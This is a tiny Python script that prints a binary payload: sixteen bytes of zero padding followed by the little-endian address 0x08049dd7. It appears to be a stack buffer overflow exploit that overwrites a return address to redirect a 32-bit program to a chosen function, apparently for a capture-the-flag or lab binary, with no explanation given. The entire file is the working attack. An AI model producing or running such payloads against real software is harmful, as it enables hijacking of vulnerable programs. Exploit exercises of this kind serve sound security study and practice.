from struct import pack 
import sys


def main():
    sys.stdout.buffer.write(pack("<I",0x00000000))
    sys.stdout.buffer.write(pack("<I",0x00000000))
    sys.stdout.buffer.write(pack("<I",0x00000000))
    sys.stdout.buffer.write(pack("<I",0x00000000))
    sys.stdout.buffer.write(pack("<I",0x08049dd7))

if __name__ == "__main__":
    main()